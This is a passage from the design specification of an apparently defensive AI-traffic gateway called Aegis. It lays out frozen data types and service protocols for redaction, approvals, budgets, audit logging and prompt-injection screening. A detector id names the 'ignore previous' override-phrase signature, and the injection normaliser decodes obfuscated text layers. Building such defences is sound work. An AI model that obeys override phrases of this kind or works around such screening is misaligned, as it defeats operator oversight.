        return "\n".join(s.text for s in self.segments)


# ---------------------------------------------------------------- findings & decisions
class Span(BaseModel):
    """Detector output (character offsets into the scanned text)."""

    start: int
    end: int
    entity: str  # canonical entity name, see CONTRACTS section 3.4
    data_class: DataClass
    detector_id: str
    score: float = 1.0
    category: str = "pii"  # pii | pci | secret | metadata


class Finding(BaseModel):
    control_id: str
    detector: str  # e.g. "pii.pesel", "secret.aws_access_key", "inj.sig.ignore_previous"
    category: str = "other"  # pii|pci|secret|metadata|injection|exfil|command|scope|taint|mcp|
    #                          budget|loop|signature|governance|content|model|approval
    entity: str | None = None
    data_class: DataClass | None = None
    severity: Severity = "medium"
    score: float = 1.0
    segment_index: int | None = None  # index into Interaction.segments
    start: int | None = None
    end: int | None = None
    excerpt: str | None = None  # MUST already be masked (rt.redactor.mask_for_log)
    replacement: str | None = None  # explicit replacement; None + redact => vault placeholder
    meta: dict[str, Any] = Field(default_factory=dict)


class Mutation(BaseModel):
    """Structural change applied by the pipeline when the final action is redact/allow."""

    target: Literal["body", "header", "route"] = "body"
    op: Literal["set", "remove"] = "set"
    path: str  # body: dotted path with [i] ("max_tokens", "result.tools[3]"); header: name;
    #            route: "model" | "provider"
    value: Any = None
    reason: str | None = None


class ApprovalDraft(BaseModel):
    """Attached to a require_approval Decision; the pipeline turns it into an ApprovalRequest."""

    kind: ApprovalKind = "action"
    action_type: str
    title: str
    summary: str | None = None
    amount_usd: float | None = None
    resource: str | None = None
    labels: dict[str, str] = Field(default_factory=dict)
    payload: dict[str, Any] = Field(default_factory=dict)  # redacted details / config proposal


class Decision(BaseModel):
    """One control's verdict on one interaction."""

    action: Action = "allow"
    control_id: str
    reason: str = ""
    score: float | None = None
    threshold: float | None = None
    approval_id: str | None = None
    mode: Literal["enforce", "monitor"] = "enforce"
    severity: Severity = "medium"
    findings: list[Finding] = Field(default_factory=list)
    mutations: list[Mutation] = Field(default_factory=list)
    approval: ApprovalDraft | None = None
    http_status: int | None = None  # override: 402 budget, 429 rate limit
    error_type: str | None = None  # policy_blocked|budget_exceeded|rate_limited|killed|...
    retry_after_s: int | None = None
    degraded: bool = False
    latency_ms: float = 0.0
    owasp: list[str] = Field(default_factory=list)
    meta: dict[str, Any] = Field(default_factory=dict)


class Redaction(BaseModel):
    segment_index: int
    path: str
    start: int  # offsets in the ORIGINAL segment text
    end: int
    entity: str
    data_class: DataClass | None = None
    placeholder: str  # "[PESEL_1]" (reversible) or "[REDACTED:SECRET]" (irreversible)
    control_id: str
    reversible: bool = True


# ---------------------------------------------------------------- approvals
class ApprovalVote(BaseModel):
    member_id: str
    role: Role
    decision: Literal["approve", "deny"]
    comment: str | None = None
    ts: datetime = Field(default_factory=utcnow)


class ApprovalRoute(BaseModel):
    required_role: ApproverLevel
    two_person: bool = False
    rule_id: str | None = None
    ttl_s: int = 900
    max_uses: int = 1


class ApprovalRequest(BaseModel):
    id: str  # "apr_..."
    org_id: str = "default"
    team_id: str | None = None
    kind: ApprovalKind = "action"
    action_type: str
    title: str
    summary: str | None = None
    requester: Identity
    amount_usd: float | None = None
    resource: str | None = None
    labels: dict[str, str] = Field(default_factory=dict)
    payload: dict[str, Any] = Field(default_factory=dict)  # redacted; never raw secrets/PII
    fingerprint: str
    required_role: ApproverLevel
    two_person: bool = False
    rule_id: str | None = None
    votes: list[ApprovalVote] = Field(default_factory=list)
    status: ApprovalStatus = "pending"
    created_at: datetime = Field(default_factory=utcnow)
    expires_at: datetime | None = None
    decided_at: datetime | None = None
    decided_by: list[str] = Field(default_factory=list)  # member ids
    request_id: str | None = None
    decision_id: str | None = None
    control_id: str | None = None
    uses: int = 0
    max_uses: int = 1
    execution: dict[str, Any] | None = None  # executor result, e.g. {"policy_version": 12}


# ---------------------------------------------------------------- usage, budgets
class Usage(BaseModel):
    input_tokens: int = 0  # total input incl. cache reads
    output_tokens: int = 0
    cache_read_tokens: int = 0
    cache_write_tokens: int = 0
    compute_s: float = 0.0  # local model compute seconds
    requests: int = 1
    tool_calls: int = 0
    cost_usd: float = 0.0  # AI cost (priced via config/pricing.yaml)
    spend_usd: float = 0.0  # real money moved by agent actions (purchases)
    estimated: bool = True


class BudgetStatus(BaseModel):
    scope: str  # "org:acme" | "team:research" | "member:maya" | "agent:analyst-bot" | "session:x"
    scope_type: Literal["org", "team", "member", "agent", "session", "model", "tool"]
    dimension: BudgetDimension
    window: BudgetWindow
    limit: float
    used: float
    reserved: float = 0.0
    pct: float = 0.0  # (used + reserved) / limit * 100
    state: BudgetState = "ok"
    resets_at: datetime | None = None
    label: str | None = None


class Reservation(BaseModel):
    id: str
    scopes: list[str]
    estimate: Usage
    created_at: datetime = Field(default_factory=utcnow)
    meta: dict[str, Any] = Field(default_factory=dict)


class BudgetDenial(BaseModel):
    scope: str
    dimension: BudgetDimension
    window: BudgetWindow
    limit: float
    used: float
    requested: float
    action: Literal["block", "require_approval", "downgrade"] = "block"
    message: str = ""
    resets_at: datetime | None = None


# ---------------------------------------------------------------- pipeline results
class Verdict(BaseModel):
    """Combined result of one pipeline evaluation."""

    id: str  # decision id "dec_..."
    request_id: str
    interaction_id: str
    action: Action
    primary: Decision | None = None  # the decision that determined `action`
    decisions: list[Decision] = Field(default_factory=list)
    segments: list[TextSegment] = Field(default_factory=list)  # after redaction
    redactions: list[Redaction] = Field(default_factory=list)
    mutations: list[Mutation] = Field(default_factory=list)
    approval: ApprovalRequest | None = None
    policy_version: int = 0
    feed_serial: int | None = None
    latency_ms: float = 0.0
    degraded: bool = False
    dry_run: bool = False
    ts: datetime = Field(default_factory=utcnow)


class Outcome(BaseModel):
    """What happened after an allowed interaction was executed (for settle / on_complete)."""

    status_code: int = 200
    usage: Usage = Field(default_factory=Usage)
    upstream_ms: float | None = None
    error: str | None = None
    provider: str | None = None
    model_used: str | None = None
    response_verdict_id: str | None = None


class RequestContext(BaseModel):
    """Per-request context shared by every control evaluation of that request."""

    model_config = ConfigDict(arbitrary_types_allowed=True)

    request_id: str
    trace_id: str = ""
    session_id: str = "default"
    identity: Identity = Field(default_factory=Identity)
    source: Source = "proxy"
    started_at: datetime = Field(default_factory=utcnow)
    t0: float = 0.0  # time.perf_counter() at ingress
    policy_version: int = 0
    feed_serial: int | None = None
    approval_token: str | None = None  # X-Aegis-Approval
    wait_for_approval_s: float = 0.0
    dry_run: bool = False
    client_ip: str | None = None
    headers: dict[str, str] = Field(default_factory=dict)  # inbound, lower-case, secrets removed
    state: dict[str, Any] = Field(default_factory=dict)  # scratch shared across controls
    timings: dict[str, float] = Field(default_factory=dict)  # stage -> ms (Server-Timing)
    policy: Any = Field(default=None, exclude=True)  # PolicySnapshot pinned at ingress


class ControlHit(BaseModel):
    control_id: str
    action: Action
    mode: Literal["enforce", "monitor"] = "enforce"
    score: float | None = None
    latency_ms: float = 0.0
    degraded: bool = False


class DecisionSummary(BaseModel):
    """Row of the live feed (SSE `decision`) and of GET /api/decisions."""

    id: str
    ts: datetime
    request_id: str
    action: Action
    kind: Kind
    surface: Surface
    direction: Direction
    destination: Destination
    model: str | None = None
    tool_name: str | None = None
    action_type: str | None = None
    amount_usd: float | None = None
    identity: Identity
    session_id: str
    source: Source
    control_id: str | None = None
    reason: str = ""
    score: float | None = None
    threshold: float | None = None
    controls: list[ControlHit] = Field(default_factory=list)  # controls that returned non-allow
    redaction_count: int = 0
    entities: list[str] = Field(default_factory=list)
    approval_id: str | None = None
    latency_ms: float = 0.0
    upstream_ms: float | None = None
    policy_version: int = 0
    feed_serial: int | None = None
    degraded: bool = False
    cost_usd: float | None = None
    tokens: int | None = None
    preview: str = ""  # masked/redacted text, <= 160 chars
    dry_run: bool = False


class WireView(BaseModel):
    """Before/after view for the drill-down. Held IN MEMORY ONLY (never persisted)."""

    decision_id: str
    original: list[TextSegment] = Field(default_factory=list)  # raw (local display only)
    outbound: list[TextSegment] = Field(default_factory=list)  # what actually left
    response_raw: str | None = None  # upstream response (placeholders intact)
    response_local: str | None = None  # rehydrated text shown to the local user
    upstream_request_preview: dict[str, Any] | None = None  # redacted outbound JSON


class DecisionDetail(DecisionSummary):
    decisions: list[Decision] = Field(default_factory=list)
    redactions: list[Redaction] = Field(default_factory=list)
    mutations: list[Mutation] = Field(default_factory=list)
    usage: Usage | None = None
    wire: WireView | None = None
    audit_seq: int | None = None
    audit_hash: str | None = None


# ---------------------------------------------------------------- audit, events, misc
class AuditEvent(BaseModel):
    model_config = ConfigDict(populate_by_name=True)

    schema_: str = Field(default="aegis.audit/1", alias="schema")
    event_id: str
    seq: int = 0  # assigned by the audit log
    ts: datetime = Field(default_factory=utcnow)
    event_type: AuditEventType
    actor: Identity | None = None
    request_id: str | None = None
    decision_id: str | None = None
    session_id: str | None = None
    trace_id: str | None = None
    kind: Kind | None = None
    surface: Surface | None = None
    direction: Direction | None = None
    destination: Destination | None = None
    model: str | None = None
    tool_name: str | None = None
    action_type: str | None = None
    amount_usd: float | None = None
    resource: str | None = None
    action: Action | None = None
    control_id: str | None = None
    reason: str | None = None
    score: float | None = None
    threshold: float | None = None
    controls: list[ControlHit] = Field(default_factory=list)
    redactions: list[Redaction] = Field(default_factory=list)
    usage: Usage | None = None
    latency_ms: float | None = None
    policy_version: int | None = None
    feed_serial: int | None = None
    data: dict[str, Any] = Field(default_factory=dict)  # event-specific, already redacted
    prev_hash: str = ""
    hash: str = ""


class AuditVerifyResult(BaseModel):
    ok: bool
    records: int = 0
    head_hash: str = ""
    broken_at_seq: int | None = None
    files: int = 0
    checked_at: datetime = Field(default_factory=utcnow)
    message: str = ""


class BusMessage(BaseModel):
    id: int
    event: str
    data: dict[str, Any] = Field(default_factory=dict)
    ts: datetime = Field(default_factory=utcnow)


class ScoreResult(BaseModel):
    score: float  # 0..1 probability of the positive (malicious / unsafe / violating) class
    label: str = ""
    model: str = "heuristic"
    latency_ms: float = 0.0
    degraded: bool = False  # True when a fallback (heuristic) replaced the configured model
    categories: list[str] = Field(default_factory=list)
    reason: str | None = None


class FeedStatus(BaseModel):
    feed_id: str = "aegis-threat-intel"
    url: str | None = None
    status: Literal["ok", "stale", "rejected", "unreachable", "disabled", "seed"] = "disabled"
    serial: int | None = None
    version: str | None = None
    published: datetime | None = None
    expires: datetime | None = None
    key_id: str | None = None
    signatures_total: int = 0
    signatures_active: int = 0
    signatures_monitor: int = 0
    signatures_quarantined: int = 0
    last_check: datetime | None = None
    last_update: datetime | None = None
    last_error: str | None = None
    history: list[dict[str, Any]] = Field(default_factory=list)


class SessionState(BaseModel):
    """Per-session mutable state for stateful controls. Namespace keys by owner: data["taint"]."""

    model_config = ConfigDict(arbitrary_types_allowed=True)

    session_id: str
    identity: Identity | None = None
    created_at: datetime = Field(default_factory=utcnow)
    last_seen: datetime = Field(default_factory=utcnow)
    data: dict[str, Any] = Field(default_factory=dict)
```

### 3.2 `src/aegis/core/protocols.py` (FROZEN)

```python
"""Aegis plug-in and service protocols. FROZEN: materialized verbatim from docs/CONTRACTS.md
section 3.2.

Cross-workstream calls go through `rt.<service>` (see RuntimeProto), never through another
workstream's private modules.
"""

from __future__ import annotations

import sqlite3
from collections.abc import AsyncIterator, Awaitable, Callable, Mapping
from typing import Any, ClassVar, Literal, Protocol, runtime_checkable

from aegis.core.policy_schema import (
    ApplyResult,
    ControlConfig,
    PatchOp,
    PolicyChange,
    PolicySnapshot,
    PolicyVersionInfo,
    ValidationReport,
    Wire,
)
from aegis.core.types import (
    Agent,
    AppliesTo,
    ApprovalDraft,
    ApprovalKind,
    ApprovalRequest,
    ApprovalRoute,
    ApprovalStatus,
    AuditEvent,
    AuditVerifyResult,
    BudgetDenial,
    BudgetStatus,
    BusMessage,
    ControlKind,
    DataClass,
    Decision,
    Direction,
    FeedStatus,
    Finding,
    Identity,
    Interaction,
    Member,
    Org,
    Outcome,
    Redaction,
    RequestContext,
    Reservation,
    Role,
    ScoreResult,
    SessionState,
    Source,
    Span,
    Team,
    TextSegment,
    Usage,
    Verdict,
    WireView,
)


# ================================================================ plug-ins (auto-discovered)
@runtime_checkable
class Control(Protocol):
    """Discovered from `CONTROLS: list[Control]` in any module under aegis.controls."""

    id: str  # "DLP-01" (must exist in the catalog, CONTRACTS section 4.4)
    family: str  # "DLP"
    name: str
    kind: ControlKind
    applies_to: AppliesTo
    owasp: list[str]
    priority: int  # lower runs first (enrich + deterministic phase); default 100

    async def evaluate(
        self, ctx: RequestContext, interaction: Interaction, cfg: ControlConfig
    ) -> Decision | None:
        """Return None (or action=allow) when nothing to report. Never raise for 'not applicable'."""
        ...


class BaseControl:
    """Convenience base class. Subclass, set the ClassVars, implement evaluate()."""

    id: ClassVar[str] = ""
    family: ClassVar[str] = ""
    name: ClassVar[str] = ""
    kind: ClassVar[ControlKind] = "deterministic"
    applies_to: ClassVar[AppliesTo] = AppliesTo()
    owasp: ClassVar[list[str]] = []
    priority: ClassVar[int] = 100

    async def enrich(self, ctx: RequestContext, interaction: Interaction, cfg: ControlConfig) -> None:
        """Optional phase 1: annotate the interaction (action_type, amount_usd, resource, labels)."""
        return None

    async def evaluate(
        self, ctx: RequestContext, interaction: Interaction, cfg: ControlConfig
    ) -> Decision | None:
        raise NotImplementedError

    async def on_complete(
        self,
        ctx: RequestContext,
        interaction: Interaction,
        verdict: Verdict,
        outcome: Outcome,
        cfg: ControlConfig,
    ) -> None:
        """Optional: called after an allowed interaction executed (settle budgets, taint, loops)."""
        return None

    def decide(
        self,
        cfg: ControlConfig,
        *,
        action: str | None = None,
        reason: str = "",
        score: float | None = None,
        findings: list[Finding] | None = None,
        **kw: Any,
    ) -> Decision:
        return Decision(
            action=action or cfg.action,  # type: ignore[arg-type]
            control_id=self.id,
            reason=reason,
            score=score,
            threshold=cfg.threshold,
            severity=cfg.severity,
            findings=findings or [],
            owasp=list(cfg.owasp or self.owasp),
            **kw,
        )


@runtime_checkable
class Detector(Protocol):
    """Discovered from `DETECTORS: list[Detector]` in aegis/redaction/detectors/*.py."""

    id: str  # "pii.pesel"
    entity: str  # "PESEL" (canonical entity, CONTRACTS section 3.4)
    data_class: DataClass
    category: str  # pii | pci | secret | metadata
    languages: tuple[str, ...]  # () = language-agnostic

    def detect(self, text: str) -> list[Span]:
        """Pure, synchronous, deterministic, no I/O. Validate checksums before returning spans."""
        ...


@runtime_checkable
class ProviderAdapter(Protocol):
    """Wire-format codec. Discovered from `ADAPTERS: list[ProviderAdapter]` in aegis/proxy/adapters/*.py."""

    wire: Wire

    def parse_request(self, body: dict[str, Any], headers: Mapping[str, str]) -> Interaction:
        """kind=model_call, surface=model.request; fills model, segments, max_output_tokens,
        est_input_tokens. Thinking blocks -> redactable=False; tool_result blocks -> trusted=False."""
        ...

    def parse_response(self, body: dict[str, Any]) -> Interaction:
        """surface=model.response, direction=in."""
        ...

    def apply_segments(self, body: dict[str, Any], segments: list[TextSegment]) -> dict[str, Any]:
        """Write (possibly redacted) segment texts back into a copy of body by segment.path."""
        ...

    def parse_usage(self, body: dict[str, Any]) -> Usage: ...

    def blocked_response(
        self,
        verdict: Verdict,
        *,
        model: str | None,
        stream: bool,
        style: Literal["message", "error"],
    ) -> tuple[int, dict[str, Any] | bytes, dict[str, str]]:
        """(status, body, headers) in this wire's format. style=message => synthetic assistant
        reply '[Aegis] Blocked by <control>: <reason>'; style=error => wire error envelope."""
        ...


# ================================================================ services (on the Runtime)
class EventBus(Protocol):
    def publish(self, event: str, data: Any) -> BusMessage:
        """Non-blocking. `data` is a dict or a pydantic model (dumped with mode="json")."""
        ...

    def subscribe(
        self, events: set[str] | None = None, *, replay: int = 0
    ) -> AsyncIterator[BusMessage]: ...

    def recent(self, n: int = 100, events: set[str] | None = None) -> list[BusMessage]: ...


class PolicyStore(Protocol):
    def snapshot(self) -> PolicySnapshot: ...

    def control_config(self, control_id: str) -> ControlConfig | None: ...

    def current_yaml(self) -> str: ...

    async def validate(self, yaml_text: str) -> ValidationReport: ...

    def diff(self, yaml_text: str) -> list[PolicyChange]: ...

    async def propose(
        self,
        actor: Identity,
        *,
        yaml_text: str | None = None,
        patch: list[PatchOp] | None = None,
        reason: str | None = None,
        base_version: int | None = None,
        source: Source = "dashboard",
    ) -> ApplyResult:
        """Governed change: validate -> diff -> pipeline(config.change) -> apply or pending approval."""
        ...

    async def apply_yaml(
        self,
        yaml_text: str,
        *,
        actor: Identity | None,
        source: str,
        reason: str | None = None,
        base_version: int | None = None,
    ) -> ApplyResult:
        """Ungoverned apply (file watcher, approval executor, startup): validate -> self-test ->
        atomic swap -> persist -> audit policy.applied -> bus policy.applied."""
        ...

    async def apply_patch(
        self, patch: list[PatchOp], *, actor: Identity | None, source: str, reason: str | None = None
    ) -> ApplyResult: ...

    async def rollback(
        self, version: int, *, actor: Identity | None, reason: str | None = None
    ) -> ApplyResult: ...

    def history(self, limit: int = 50) -> list[PolicyVersionInfo]: ...

    def get_version_yaml(self, version: int) -> str | None: ...

    def on_change(self, callback: Callable[[PolicySnapshot], Any]) -> None:
        """Register a callback (sync or async) invoked after each successful swap."""
        ...


class OrgService(Protocol):
    async def resolve_identity(
        self, headers: Mapping[str, str], *, hints: Mapping[str, str] | None = None
    ) -> Identity:
        """Data plane: aegis_* key (Authorization/x-api-key) > X-Aegis-Agent > X-Aegis-Member >
        hints (e.g. {"agent_id": "claude-code@platform"}) > anonymous agent. Never consumes
        non-aegis keys (they are passed through to the upstream untouched)."""
        ...

    async def resolve_viewer(
        self, headers: Mapping[str, str], query: Mapping[str, str] | None = None
    ) -> Identity:
        """Dashboard: X-Aegis-View-As header or ?view_as= query; default = first owner."""
        ...

    async def org(self) -> Org: ...

    async def list_teams(self) -> list[Team]: ...

    async def list_members(self) -> list[Member]: ...

    async def list_agents(self) -> list[Agent]: ...

    async def get_member(self, member_id: str) -> Member | None: ...

    async def get_agent(self, agent_id: str) -> Agent | None: ...

    async def members_with_role(self, min_role: Role, team_id: str | None = None) -> list[Member]: ...

    async def resources(self) -> dict[str, Any]:
        """Seed `resources` inventory: {"databases": [{id, environment, tables: [{name,
        sensitivity, categories}]}], "vendors": [{id, name, approved, host, plans}]}."""
        ...


class BudgetLedger(Protocol):
    def scopes_for(self, identity: Identity, session_id: str) -> list[str]:
        """Budget chain checked with AND semantics, e.g. ['org:acme-capital', 'team:trading',
        'agent:trading-copilot@trading', 'session:ses_1']. `member:<id>` is included only when the
        principal is a human member (agents are budgeted per agent, not per sponsor)."""
        ...

    async def reserve(
        self, ctx: RequestContext, estimate: Usage, scopes: list[str] | None = None
    ) -> Reservation | BudgetDenial:
        """Atomic check-and-reserve across every level (AND). Denial names the scope that tripped."""
        ...

    async def settle(self, reservation: Reservation, actual: Usage) -> list[BudgetStatus]: ...

    async def release(self, reservation: Reservation) -> None: ...

    async def status(self, scope: str | None = None) -> list[BudgetStatus]: ...

    async def reset(self, scope: str | None = None) -> None: ...

    def price(self, model: str | None, usage: Usage) -> float:
        """USD for this usage according to config/pricing.yaml (local models: compute_s shadow price)."""
        ...


ApprovalExecutor = Callable[[ApprovalRequest], Awaitable[dict[str, Any] | None]]


class ApprovalService(Protocol):
    def route(
        self,
        *,
        kind: ApprovalKind,
        action_type: str,
        requester: Identity,
        amount_usd: float | None = None,
        resource: str | None = None,
        labels: Mapping[str, str] | None = None,
        changes: list[PolicyChange] | None = None,
    ) -> ApprovalRoute:
        """First matching rule: approvals.config_rules for kind config_change, approvals.rules for
        every other kind; no match -> defaults.default_config_approver / default_approver."""
        ...

    def can_approve(self, voter: Identity, req: ApprovalRequest) -> tuple[bool, str]: ...

    def fingerprint(self, identity: Identity, interaction: Interaction) -> str:
        """HMAC-SHA256 (aegis.core.crypto.hmac_hex, purpose "approval") over canonical JSON of
        {org, principal, action_type or tool_name, tool_args minus volatile keys, resource, amount}."""
        ...

    async def find_preapproved(
        self, ctx: RequestContext, interaction: Interaction
    ) -> ApprovalRequest | None:
        """Approved, unexpired, uses < max_uses; matched by ctx.approval_token or fingerprint.
        Consumes one use when found; redemptions of the same approval within 30 s count as one use
        (the hook and the MCP proxy both see the same call)."""
        ...

    async def request(
        self, ctx: RequestContext, interaction: Interaction, decision: Decision
    ) -> ApprovalRequest:
        """Create (or reuse the pending one with the same fingerprint) from decision.approval.
        Applies auto/deny routes immediately. Publishes approval.created + audit."""
        ...

    async def wait(self, approval_id: str, timeout_s: float) -> ApprovalRequest: ...

    async def vote(
        self,
        approval_id: str,
        voter: Identity,
        decision: Literal["approve", "deny"],
        comment: str | None = None,
    ) -> ApprovalRequest:
        """Raises PermissionError if the voter may not decide. Runs the executor on approval."""
        ...

    async def cancel(self, approval_id: str, actor: Identity) -> ApprovalRequest: ...

    async def get(self, approval_id: str) -> ApprovalRequest | None: ...

    async def list_requests(
        self,
        *,
        status: ApprovalStatus | None = None,
        kind: ApprovalKind | None = None,
        limit: int = 200,
    ) -> list[ApprovalRequest]: ...

    async def create_manual(self, requester: Identity, draft: ApprovalDraft) -> ApprovalRequest: ...

    def register_executor(self, kind: ApprovalKind, fn: ApprovalExecutor) -> None: ...


class AuditSink(Protocol):
    async def record(self, event: AuditEvent) -> AuditEvent:
        """Assign seq, chain hash, append JSONL, index in SQLite. Must never raise to callers."""
        ...

    async def verify(self) -> AuditVerifyResult: ...

    async def query(
        self,
        *,
        event_type: str | None = None,
        since: Any = None,
        limit: int = 200,
        cursor: str | None = None,
    ) -> tuple[list[AuditEvent], str | None]: ...

    def export(self, fmt: Literal["jsonl", "csv", "ocsf"], **filters: Any) -> AsyncIterator[bytes]: ...


class MetricsSink(Protocol):
    def observe_verdict(self, ctx: RequestContext, interaction: Interaction, verdict: Verdict) -> None: ...

    def observe_upstream(
        self, provider: str, model: str | None, seconds: float, usage: Usage | None = None
    ) -> None: ...

    def observe_overhead(self, phase: str, seconds: float) -> None: ...

    def inc(self, name: str, labels: Mapping[str, str] | None = None, value: float = 1.0) -> None: ...

    def set_gauge(self, name: str, value: float, labels: Mapping[str, str] | None = None) -> None: ...

    def render(self) -> tuple[bytes, str]:
        """Prometheus exposition bytes + content type (for GET /metrics)."""
        ...


class RedactionEngine(Protocol):
    def detect(
        self, text: str, *, entities: set[str] | None = None, use_ner: bool = False
    ) -> list[Span]: ...

    async def detect_async(
        self, text: str, *, entities: set[str] | None = None, use_ner: bool = True
    ) -> list[Span]: ...

    def apply(
        self, ctx: RequestContext, segments: list[TextSegment], findings: list[Finding]
    ) -> tuple[list[TextSegment], list[Redaction]]:
        """Merge overlapping spans (longest wins), tokenize via the session vault, return new
        segments + redaction records. Non-redactable segments are left untouched."""
        ...

    def rehydrate(self, ctx: RequestContext, text: str) -> str:
        """Replace this session's placeholders with original values (local delivery only)."""
        ...

    def mask_for_log(self, text: str, max_len: int = 160) -> str:
        """Irreversible masking for excerpts/previews/logs (e.g. 411111******1111, [EMAIL])."""
        ...

    def detectors(self) -> list[Detector]: ...


class SemanticEngine(Protocol):
    async def injection_score(self, text: str) -> ScoreResult: ...

    async def moderate(self, text: str) -> ScoreResult: ...

    async def embed(self, texts: list[str]) -> list[list[float]]: ...

    async def similarity(self, text: str, references: list[str]) -> float: ...

    async def judge(self, rule: str, text: str) -> ScoreResult: ...

    def status(self) -> dict[str, Any]:
        """{"mode": "on|off|auto", "degraded": bool, "models": [{"name", "backend", "loaded", "p50_ms"}]}"""
        ...


class FeedManager(Protocol):
    @property
    def serial(self) -> int | None: ...

    def status(self) -> FeedStatus: ...

    async def refresh(self) -> FeedStatus: ...

    def signatures(self) -> list[dict[str, Any]]: ...


class SessionStore(Protocol):
    def get(self, session_id: str) -> SessionState:
        """Get or create."""
        ...

    def all(self) -> list[SessionState]: ...


class ControlRegistry(Protocol):
    def all(self) -> list[Control]: ...

    def get(self, control_id: str) -> Control | None: ...


class Pipeline(Protocol):
    def new_context(
        self,
        *,
        source: Source,
        identity: Identity,
        session_id: str | None = None,
        headers: Mapping[str, str] | None = None,
        approval_token: str | None = None,
        wait_for_approval_s: float = 0.0,
        dry_run: bool = False,
    ) -> RequestContext: ...

    async def evaluate(
        self,
        ctx: RequestContext,
        interaction: Interaction,
        *,
        policy: PolicySnapshot | None = None,
        dry_run: bool = False,
    ) -> Verdict:
        """enrich -> deterministic -> semantic (parallel, timeouts, fail_mode) -> combine ->
        approvals -> redaction/mutations -> audit + metrics + bus `decision`."""
        ...

    async def complete(
        self, ctx: RequestContext, interaction: Interaction, verdict: Verdict, outcome: Outcome
    ) -> None:
        """After execution: on_complete hooks (budget settle, taint, loops), usage audit."""
        ...

    def wire(self, decision_id: str) -> WireView | None: ...

    def attach_response(
        self, decision_id: str, *, response_raw: str | None, response_local: str | None
    ) -> None: ...


class RuntimeProto(Protocol):
    """Service container; core-gateway's aegis.core.runtime.Runtime implements it.
    Obtain with `from aegis.core.runtime import get_runtime` or FastAPI dep `aegis.core.deps.get_rt`."""

    settings: Any
    bus: EventBus
    policy: PolicyStore
    org: OrgService
    ledger: BudgetLedger
    approvals: ApprovalService
    audit: AuditSink
    metrics: MetricsSink
    redactor: RedactionEngine
    semantic: SemanticEngine
    feed: FeedManager
    sessions: SessionStore
    controls: ControlRegistry
    pipeline: Pipeline

    def db(self) -> sqlite3.Connection:
        """New SQLite connection (WAL, row_factory=sqlite3.Row, check_same_thread=False)."""
        ...


__all__ = [
    "ApprovalExecutor", "ApprovalService", "AuditSink", "BaseControl", "BudgetLedger", "Control",
    "ControlRegistry", "Detector", "EventBus", "FeedManager", "MetricsSink", "OrgService",
    "Pipeline", "PolicyStore", "ProviderAdapter", "RedactionEngine", "RuntimeProto",
    "SemanticEngine", "SessionStore",
    # re-exported for convenience
    "Direction", "Redaction", "BudgetDenial", "Reservation",
]
```

(The policy models imported above are in §4.2.)

### 3.3 Runtime, service factories and public import surfaces

`aegis.core.runtime.Runtime` (core-gateway) implements `RuntimeProto`. It builds services in this order, calls `await svc.start()` (if present) in the same order and `await svc.stop()` in reverse. `create(rt)` must be cheap and side-effect free; heavy work goes in `start()` (models load lazily or in a background task). If a factory import or call fails, Runtime logs ERROR and installs the Null fallback (core-gateway, `aegis.core.nulls`) so the rest still works.

| `rt.` attr | Factory (`module:create`) | Owner | Null fallback (must keep the gateway usable) |
|---|---|---|---|
| `settings` | `aegis.settings:get_settings` | core-gateway | — |
| `bus` | `aegis.core.bus:create` | core-gateway | — |
| `metrics` | `aegis.metrics.prom:create` | audit-metrics | no-op; `render()` returns empty exposition |
| `audit` | `aegis.audit.log:create` | audit-metrics | log-only; `verify()` → `ok=False, message="audit disabled"` |
| `policy` | `aegis.policy.store:create` | policy-engine | parse `AEGIS_POLICY` once into `PolicyDoc` (no profiles, no watch); changes rejected |
| `org` | `aegis.org.service:create` | org-rbac | single org `default`; identity from `X-Aegis-*` headers; viewer = owner |
| `sessions` | `aegis.core.sessions:create` | core-gateway | — |
| `ledger` | `aegis.budgets.ledger:create` | budgets-ledger | always reserves; `status()` → `[]` |
| `redactor` | `aegis.redaction.engine:create` | redaction-engine | detect → `[]`; apply → spans replaced by `[REDACTED]`; mask_for_log masks digits/@ |
| `semantic` | `aegis.semantic.engine:create` | semantic-models | every score `0.0`, `degraded=True` |
| `feed` | `aegis.feed.manager:create` | threat-feed | `serial=None`, status `disabled` |
| `approvals` | `aegis.approvals.service:create` | approvals-engine | **fail-closed**: `request()` returns `status="denied"`, reason "approvals unavailable" |
| `controls` | `aegis.core.discovery:create_registry` | core-gateway | — |
| `pipeline` | `aegis.core.pipeline:create` | core-gateway | — |

**Public import surfaces.** You may import from another workstream **only** these modules (everything else is private and may change):

| Module | Owner | Exposes (exact names) |
|---|---|---|
| `aegis.core.types`, `aegis.core.protocols`, `aegis.core.policy_schema` | scaffold | everything (frozen) |
| `aegis.core.runtime` | core-gateway | `get_runtime() -> RuntimeProto` (raises `RuntimeError` before startup) |
| `aegis.core.deps` | core-gateway | FastAPI deps: `async get_rt(request) -> RuntimeProto`; `async viewer(request) -> Identity` (calls `rt.org.resolve_viewer`); `require_role(min_role: Role)` → dependency returning the viewer or raising 403 `forbidden` |
| `aegis.core.errors` | core-gateway | `api_error(status: int, type: str, message: str, **fields) -> JSONResponse` (envelope §5.3); `class AegisHTTPError(Exception)` |
| `aegis.core.crypto` | core-gateway | `hmac_hex(value: str | bytes, *, purpose: str = "fp") -> str` — HMAC-SHA256 with the persistent key (`AEGIS_HMAC_KEY`, else generated once into `data/keys/hmac.key`). **Use it for every fingerprint of a sensitive value** (approval fingerprints, audit value fingerprints, agent key hashes); never plain sha256 of PAN/PESEL/keys |
| `aegis.core.paths` | core-gateway | `get_path(obj, path, default=None)`, `set_path(obj, path, value)`, `remove_path(obj, path)` (dotted, `[i]`, `[key=value,…]` selectors); `glob_match(pattern, value) -> bool` (fnmatchcase; `*` matches any) |
| `aegis.settings` | core-gateway | `Settings` (pydantic, fields = env vars §6.5 lower-cased without `AEGIS_`), `get_settings()` |
| `aegis.app` | core-gateway | `create_app(settings: Settings | None = None) -> FastAPI` (lifespan builds Runtime; `app.state.rt`) |
| `aegis.injection.normalize` | injection-defense | `normalize(text: str) -> Normalized` with fields `text: str` (NFKC, invisibles stripped, homoglyphs folded), `variants: list[str]` (decoded base64/hex/url/rot13 layers, depth ≤ 2), `flags: set[str]` (`"invisible"`, `"tag_chars"`, `"homoglyph"`, `"base64"`, …) |
| `aegis.redaction.validators` | redaction-engine | `luhn_ok(d)`, `card_ok(d)`, `pesel_ok(d)`, `nip_ok(d)`, `regon_ok(d)`, `iban_ok(s)`, `pl_id_card_ok(s)` → `bool`, `digits_only(s)`, `shannon_entropy(s)` (names as in `staging/pii/validators.py`) |
| `aegis.actions.classify` | action-guards | `classify(interaction, rules: list[ActionRule]) -> tuple[str|None, float|None, str|None, dict[str,str]]` (action_type, amount_usd, resource, labels) |
